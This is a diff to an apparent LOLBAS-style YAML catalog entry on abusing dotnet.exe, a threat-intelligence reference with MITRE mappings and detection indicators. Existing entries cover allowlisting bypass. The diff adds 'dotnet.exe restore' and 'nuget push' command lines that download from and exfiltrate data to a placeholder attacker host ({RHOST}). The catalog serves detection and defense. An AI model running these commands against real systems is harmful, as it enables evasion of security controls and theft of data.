@@ -7,7 +7,7 @@ Commands:
   - Command: dotnet.exe {PATH:.dll}
     Description: dotnet.exe will execute any DLL even if applocker is enabled.
     Usecase: Execute code bypassing AWL
-    Category: AWL Bypass
+    Category: AWL bypass
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with .NET installed
@@ -34,23 +34,47 @@ Commands:
   - Command: dotnet.exe msbuild {PATH:.csproj}
     Description: dotnet.exe with msbuild (SDK Version) will execute unsigned code
     Usecase: Execute code bypassing AWL
-    Category: AWL Bypass
+    Category: AWL bypass
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 10 and up with .NET Core installed
     Tags:
       - Execute: CSharp
+  - Command: dotnet.exe restore --source http://{RHOST}/packages/ {PATH:.csproj}
+    Description: dotnet.exe will download NuGet packages (.nupkg) from an arbitrary HTTP server specified via the --source flag.
+    Usecase: Download files from a remote attacker-controlled server using a Microsoft-signed binary. Traffic goes over HTTP/HTTPS as NuGet protocol requests.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10 and up with .NET SDK installed
+    Tags:
+      - Download: HTTP
+  - Command: dotnet.exe nuget push {PATH:.nupkg} --source http://{RHOST}/api/v2/package --api-key {APIKEY}
+    Description: dotnet.exe will upload a NuGet package (.nupkg) to an arbitrary HTTP server via HTTP PUT request.
+    Usecase: Exfiltrate data by packaging it as a .nupkg file and pushing it to an attacker-controlled NuGet server. A .nupkg is a ZIP file that can contain arbitrary data.
+    Category: Upload
+    Privileges: User
+    MitreID: T1048
+    OperatingSystem: Windows 10 and up with .NET SDK installed
+    Tags:
+      - Upload: HTTP
 Full_Path:
-  - Path: 'C:\Program Files\dotnet\dotnet.exe'
+  - Path: C:\Program Files\dotnet\dotnet.exe
+  - Path: C:\Program Files (x86)\dotnet\dotnet.exe
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_dotnet.yml
   - BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
   - IOC: dotnet.exe spawned an unknown process
+  - IOC: dotnet.exe making outbound HTTP connections to non-standard NuGet sources
+  - IOC: dotnet.exe command line containing --source with non-Microsoft URLs
+  - IOC: dotnet.exe nuget push command uploading to external servers
 Resources:
   - Link: https://twitter.com/_felamos/status/1204705548668555264
   - Link: https://gist.github.com/bohops/3f645a7238d8022830ecf5511b3ecfbc
   - Link: https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/
   - Link: https://learn.microsoft.com/en-us/dotnet/fsharp/tools/fsharp-interactive/
+  - Link: https://learn.microsoft.com/en-us/dotnet/core/tools/dotnet-restore
+  - Link: https://learn.microsoft.com/en-us/dotnet/core/tools/dotnet-nuget-push
 Acknowledgement:
   - Person: felamos
     Handle: '@_felamos'
@@ -58,3 +82,5 @@ Acknowledgement:
     Handle: '@bohops'
   - Person: yamalon
     Handle: '@mavinject'
+  - Person: Noam
+    Handle: '@pumi96'
